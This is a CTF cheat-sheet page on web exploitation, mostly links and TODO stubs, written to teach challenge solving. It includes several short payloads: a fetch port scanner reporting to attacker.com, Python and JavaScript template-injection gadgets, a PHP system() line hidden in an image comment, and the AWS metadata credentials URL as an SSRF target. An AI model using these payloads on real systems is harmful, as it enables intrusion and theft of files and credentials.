# Web

Web challenges can range a lot. This page aims to cover many common topics for both client and server challenges.

## Tools

### General Tips

Sometimes, a tool has almost everything you need, but you want to slightly modify the HTTP traffic it sends to target. This can be achieved with an HTTP proxy. An awesome guide on telling your tools to use an HTTP proxy can be found [here](https://web.archive.org/web/20200214214020/https://blog.ropnop.com/proxying-cli-tools/).

### Making Requests

For basic requests from the command-line, [curl](https://github.com/curl/curl) is king.

If you need a Python library, synchronous requests are best done with the [`requests`](https://requests.readthedocs.io) package. Asynchronous requests are best done with the [`aiohttp`](https://docs.aiohttp.org) package.

### Interacting with QUIC and HTTP/3

If you see UDP traffic to port 8443, this should be a give away for [QUIC](https://www.chromium.org/quic). The best client libraries and/or tools I've found for interacting with QUIC servers are:

* [Quiche](https://github.com/cloudflare/quiche): A Rust library from CloudFlare. Ships with minimal client/server example programs.
* [curl](https://curl.haxx.se/): Follow [these instructions](https://github.com/curl/curl/blob/3ea15be3f3d6c77adc9fe22ad0b0208466d622d1/docs/HTTP3.md#quiche-version) for building from source, using Quiche as the underlying HTTP/3 library.
* [aioquic](https://github.com/aiortc/aioquic): The best option if you require a Python library.

## Client-side

### Document Object Model (DOM)

TODO

#### DOM Clobbering

TODO

Excellent resources (with many good examples) on this topic include:

* [Postcards from the post-XSS world](http://lcamtuf.coredump.cx/postxss/)
* [Clobbering the clobbered - Advanced DOM Clobbering](https://medium.com/@terjanq/dom-clobbering-techniques-8443547ebe94)
* [The Spanner - DOM Clobbering](http://www.thespanner.co.uk/2013/05/16/dom-clobbering/)

#### Generic HTML Tag Primitives

TODO

#### Chromium-based Browser HTML Tag Primitives

TODO

### Open Redirects

TODO

### Dangling Markup Exfiltration

TODO: http://lcamtuf.coredump.cx/postxss/

### CSS Exfiltration

TODO

### WebAssembly and Friends

#### Overview

WebAssembly is a binary-format stack-based language. Originally designed to be run in the browser, there are now [a lot of non-browser runtimes](https://github.com/appcypher/awesome-wasm-runtimes).

The best easy-to-consume wasm reference I have found is the [WebAssembly Reference Manual](https://github.com/sunfishcode/wasm-reference-manual/blob/master/WebAssembly.md). If you need the nitty gritty details, try the [official spec](https://webassembly.github.io/spec/core/intro/overview.html).

#### Static Analysis

The [WebAssembly Binary Toolkit](https://github.com/WebAssembly/wabt) is a pretty built out toolkit full of utilities for offline reasoning of WebAssembly code. For a practical application, see [this ctf writeup](http://web.archive.org/web/20200308134223/http://ctfhacker.com/reverse/2018/09/16/flareon-2018-chrome-debugger.html).

#### Dynamic Analysis

Out of all the major browsers, I have found Chrome's WebAssembly debugging experience to be the best.

For more structued analysis, [Wasabi](http://wasabi.software-lab.org/) is the king of WebAssembly tracing in the browser. For a practical application, see [this ctf writeup](https://web.archive.org/web/20190821193041/http://ctfhacker.com/reverse/2018/09/16/flareon-2018-wasabi.html).

#### Portable Native Client (PNaCl)

[Portable Native Client](https://en.wikipedia.org/wiki/Google_Native_Client) was an attempt at binary client-side code before WebAssembly. Its security implications are explored in [this article](https://web.archive.org/web/20200308133606/https://shhnjk.blogspot.com/2019/07/intro-to-chromes-gold-features.html?m=1).

### Cookies

#### SameSite Cookies

TODO: https://web.dev/samesite-cookies-explained/

TODO: https://medium.com/@renwa/bypass-samesite-cookies-default-to-lax-and-get-csrf-343ba09b9f2b

### Interesting HTML Elements

TODO: https://research.securitum.com/security-analysis-of-portal-element/

### Cross-Site Scripting (XSS)

TODO

This section only covered some of the basics of XSS; techniques from the below sections can be used in tandem with this information to create solutions for more complex environments.

#### XSS Sanitization

TODO: DOMpurify

TODO: native browser APIs

### JavaScript Utilities

This section covers some basic utilities provided in the major browsers' native runtimes.

#### `fetch`

The [`fetch`](https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API/Using_Fetch) API is the modern solution for making client-side requests from the browser. GitHub has some nice basic documentation on this API [here](https://github.github.io/fetch/).

A nice snippet from [@lbherrera_](https://twitter.com/lbherrera_)'s [h1415 writeup](https://lbherrera.github.io/lab/h1415-ctf-writeup.html) show's how to use `fetch` for port scanning:

```js
const checkPort = (port) => {
    fetch(`http://localhost:${port}`, {mode: 'no-cors'}).then(() => {
        let img = document.createElement('img');
        img.src = `http://attacker.com/ping?port=${port}`;
    });
}

for(let i=0; i<1000; i++) {
    checkPort(i);
}
```

#### `XMLHttpRequest`

The [`XMLHttpRequest`](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/Using_XMLHttpRequest) is the legacy API for creating requests from client-side JavaScript in the browser.

Here's a short example of sending a `GET` request and reading the response:

```js
function get_resp_body(xhr) {
  if (!xhr.responseType || xhr.responseType === "text") {
    return xhr.responseText;
  } else if (xhr.responseType === "document") {
    return xhr.responseXML;
  } else if (xhr.responseType === "json") {
    return xhr.responseJSON;
  } else {
    return xhr.response;
  }
  return data;
}

var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
  if (xhr.readyState == XMLHttpRequest.DONE) {
    console.log(get_resp_body(xhr));
  }
}
xhr.open('GET', 'http://www.google.com', true);
xhr.send(null);
```

### DNS Rebinding

[DNS rebininding](https://en.wikipedia.org/wiki/DNS_rebinding) is a type of client-side attack for pivoting through the browser into a victim's private network.

The gist of this type of attack is serving DNS records with a low TTL for an attacker-controlled domain, and then swapping out the IP address for that record so that it resolves to private IPs. Daniel Miessler has a great explanation [here](https://danielmiessler.com/blog/dns-rebinding-explained/).

A potentially useful tool for carrying out this attack is [Tavis Ormandy's `rbndr` service](https://github.com/taviso/rbndr).

### Client-side Sandbox Escapes

For [`import`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/import) and [`async function`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/async_function) based techniques, see [this article](https://web.archive.org/web/20200301182100/http://blog.bentkowski.info/web/20180803213325/http://blog.bentkowski.info/2017/11/yet-another-google-caja-bypasses-hat.html?m=1).

### Browser JS Runtime Quirks

TODO: hoisting -- https://developer.mozilla.org/en-US/docs/Glossary/Hoisting

### Content Security Policy (CSP)

#### JSONP Bypasses

TODO

#### Script `src` Directory Bypasses

TODO

## Server-side

TODO

## Server-side Template Injection (SSTI)

### Enumeration

Nothing comes close to [`tplmap`](https://github.com/epinna/tplmap) for exploratory injection scanning and automated exploitation.

### Payloads

If you don't use the `tplmap` project for injection enumeraton, you can at least use it as a reference for [different templating engine payloads](https://github.com/epinna/tplmap/blob/749807616ab1b173827913b325c5974e8f77f3d8/plugins/engines).

### JavaScript SSTI Tips

In the event that the server restricts the permitted set of input characters, you may have to get fancy. Fortunately, this is a trodden path. The [jsfuck](https://github.com/aemkei/jsfuck) project has compiled gadgets for a primitive set of characters that can be used to generate any JavaScript payload.

Good `jsfuck`-inspired gadget lists can be found [in its source](https://github.com/aemkei/jsfuck/blob/76fe36a5c0e3365c0e7fae8086e92233b907d2a5/jsfuck.js#L9-L115) and [in its Wikipedia page](https://en.wikipedia.org/wiki/JSFuck).

The gist of most JavaScript injections involve walking up to the [`Function`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function) constructor, defining a generic payload from a string, and executing the new `Function` definition. This usually equates to something along the lines of `[]['fill']['constructor']('alert(1);')()`.

These techniques are applicable to frontend injections, as well.

### Python SSTI Tips

Most Python template injection challenges will involve trying to walk your way up to process-spawning reference somewhere in memory. A lot of guides will tell you to get a reference to `subprocess.Popen` via `__mro__ -> object -> __subclasses__()`, but I think a much better generic solution is walking up to `builtins['__import__']` via the `__globals__` attribute of any defined method of any object instance floating around in memory.

If seeing command output inline is a must, then aiming for a payload that achieves `__import__('subprocess').check_output('/bin/bash -c "cat fl* /fl* /home/*/fl*"', shell=True)` is a good target.

For Flask/Jinja SSTI problems, if `_` is blacklisted then a pretty generic gadget for it is `g.get|string|slice(4)|first|last`. A great overall reference for Flask/Jinja SSTI can be found [here](https://web.archive.org/web/20200217202837/https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti).

### Deserialization Attacks

#### Java

TODO: https://github.com/NickstaDB/SerializationDumper

TODO: https://github.com/frohoff/ysoserial

### File Uploads

#### Crafting Custom Images

Image manipulation on the command-line makes crafting payloads a little bit easier:

```sh
# create an empty image
convert -size 32x32 xc:white empty.jpg

# add a comment to an image
exiftool -Comment=$'<?php system("cat fl* /fl* /home/*/fl*"); ?>' empty.jpg
```

#### Polyglots

TODO

### Nginx Knowledge

TODO: well-known path bypass

### Apache Knowledge

TODO

### PHP Tips and Tricks

TODO: https://paste.q3k.org/paste/mp0iN5mw#xy+cOL+ON0sWRaJ7p1NZAFkcDTM1BKkYXaq9vZthxK0

TODO: https://blog.orange.tw/2018/10/hitcon-ctf-2018-one-line-php-challenge.html

TODO: mt_seed discussion -- http://www.openwall.com/php_mt_seed/

#### Advanced LFI Techniques

TODO: https://github.com/tarunkant/Gopherus

TODO: https://docs.google.com/document/u/1/d/1eALKwCyogM5Mw_D4qWe48X-PAGZw_2vT82aP0EPIr-8

### HTTP Parameter Pollution

TODO

TODO: PHP usually gives preference to the last occurrence

TODO: Flask ImmutableDict gets last occurence of parameter

TODO: Django param dict? will get first occurence of parameter

TODO: express.js gives array of all provided values

TODO: differences between WAF and web app parsing can lead to bypass

TODO: payloads can be built if parameter values are concatenated

### XXE

TODO: trying application/xml for API endpoints

TODO: linux/windows general gagdets

TODO: https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/

TODO: leaking file contents from errors that report file name (https://www.youtube.com/watch?v=0fdpFQXWVu4)

### JavaScript Web Tokens (JWT)

#### Overview

TODO

#### JWTS

TODO: https://hackernoon.com/json-web-tokens-jwt-demystified-f7e202249640

TODO: https://www.npmjs.com/package/jwk-to-pem

## Cloud Services

Challenges involving public cloud providers will likely require something like:

* Enumeration of static file buckets like [S3](https://aws.amazon.com/s3/) or [Cloud Storage]().
* SSRF to internal metadata endpoint to links like `http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`.
* [IAM](https://aws.amazon.com/iam/) privilege escalation.

### Amazon Web Services

For legitimate interaction with different AWS products, the [`awscli` package](https://github.com/aws/aws-cli) is king.

[Rhino Security Labs](https://rhinosecuritylabs.com/) publishes the best content and writes the best tools for AWS security assessments. Their tool [`pacu`](https://github.com/RhinoSecurityLabs/pacu) automates a lot of attacks.

The following articles are useful references, too:

* [Rhino Security Labs - Kicking the S3 Bucket](https://rhinosecuritylabs.com/penetration-testing/penetration-testing-aws-storage/)
* [An SSRF, privileged AWS keys and the Capital One breach](https://blog.appsecco.com/an-ssrf-privileged-aws-keys-and-the-capital-one-breach-4c3c2cded3af)

### Google Cloud Platform

The best guide to [GCP](https://cloud.google.com/) security and red teaming I've found was [published by GitLab](https://web.archive.org/web/20200212192707/https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/).
